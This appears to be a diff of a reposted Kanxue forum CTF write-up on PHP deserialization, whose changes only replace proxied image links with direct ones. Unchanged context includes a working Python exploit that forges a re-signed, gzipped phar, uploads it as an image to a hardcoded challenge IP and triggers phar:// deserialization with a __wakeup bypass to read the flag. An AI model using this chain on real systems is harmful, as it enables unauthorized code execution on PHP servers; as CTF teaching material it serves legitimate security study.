@@ -14,7 +14,7 @@ ___发表于_
 
 收录于合集
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180801.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180801.png)  
 
 本文为看雪论坛优秀文章
 
@@ -270,7 +270,7 @@ test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果�
 这里我们要求输出 success!! ，但执行反序列化后得到的对象有了引用，给了 a 变量，后面程序接着就抛出一个异常，非正常结束，导致未正常完成 GC
 机制，即没有执行 __destruct 。  
 直接构造反序列化 test
-类得到：![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180817.png)所以我们要反序列化手动去
+类得到：![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180817.png)所以我们要反序列化手动去
 “销毁” 创造的对象。这里我们可以利用数组来完成。构造：
 
   *   *   *   *   * 
@@ -350,7 +350,7 @@ success!!![]()我们序列化一个数组对象，考虑反序列化本字符串
 
   
 输出  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180819.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180819.png)
 
 ##  
 
@@ -475,7 +475,7 @@ _https://www.php.net/manual/zh/phar.fileformat.signature.php#phar.fileformat.sig
 ）Phars containing a signature always have the signature appended to the end of
 the Phar archive after the loader, manifest, and file contents. The signature
 formats supported at this time are MD5, SHA1, SHA256, SHA512, and OPENSSL.  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180820.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180820.png)  
 用winhex或010-editor查看phar文件签名类型（以上述代码生成的phar文件为例）![]()以默认的sha1签名为例：
 
   *   *   *   *   *   *   *   *   *   * 
@@ -533,13 +533,13 @@ exp:
     import requestsfrom hashlib import sha1import gzipimport redef getPhar():    with open('phar.phar', 'rb') as file:        f = file.read()    s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）    s = s.replace(b'3:{', b'4:{')# 绕过__wakeup    h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节    newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)    return gzip.compress(newf)# 进行gzip压缩 def upload(file):    burp0_url = "http://1.14.71.254:28403/upload.php"    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://1.14.71.254:28403", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfXBfemuGHEVNBhN8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://1.14.71.254:28403/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}    burp0_data = b"------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"file\"; filename=\"phar.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + file + b"\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8--\r\n"    # 注意数据类型为byte类型，应该file为byte类型，相同数据类型才能合并    requests.post(burp0_url, headers=burp0_headers, data=burp0_data) def getFlag():    burp0_url = "http://1.14.71.254:28403/"    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Origin": "http://1.14.71.254:28403", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://1.14.71.254:28403/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}    burp0_data = {"file": "phar://./upload/phar.jpg/test.txt", "submit": ''}    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    return re.findall('(NSSCTF\{.*?\})', res.text)[0] if __name__ == '__main__':    upload(getPhar())    print(getFlag())
 
   
-运行得到flag。![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180822.png)ps：注意如果用burp代理抓包上传gzip压缩后的phar可能会有bug，burp会改变gzip数据，导致无法识别phar文件  
+运行得到flag。![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180822.png)ps：注意如果用burp代理抓包上传gzip压缩后的phar可能会有bug，burp会改变gzip数据，导致无法识别phar文件  
 
   
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180823.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180823.png)
 
   
 
@@ -548,7 +548,7 @@ exp:
 https://bbs.kanxue.com/user-home-952339.htm
 
 *本文由看雪论坛 pank1s 原创，转载请注明来自看雪社区  
-[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180824.png)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458493067&idx=2&sn=098f64ed7bb35149efbb12c7a9551b08&chksm=b18e900186f91917b83a68408448658fba17a6a55011c39e7b1c504b42539710cd466e35fa43&scene=21#wechat_redirect)  
+[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180824.png)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458493067&idx=2&sn=098f64ed7bb35149efbb12c7a9551b08&chksm=b18e900186f91917b83a68408448658fba17a6a55011c39e7b1c504b42539710cd466e35fa43&scene=21#wechat_redirect)  
 
  **#** **  往期推荐  
 **
@@ -569,25 +569,25 @@ asn1码流](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495696&idx=
 6、[浅析信息的表示和处理](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495256&idx=1&sn=a7a40804328b9112e0f63576d3a67127&chksm=b18e999286f9108422a9ff311eb7b033bc6ffed28a1913b3d3f87022b07892aa2ec2998f3fe3&scene=21#wechat_redirect)
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180825.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180825.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
 
  **球分享**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
 
  **球点赞**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180826.png)
 
  **球在看**
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180829.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230301180829.png)
 
 点击“阅读原文”，了解更多！
 
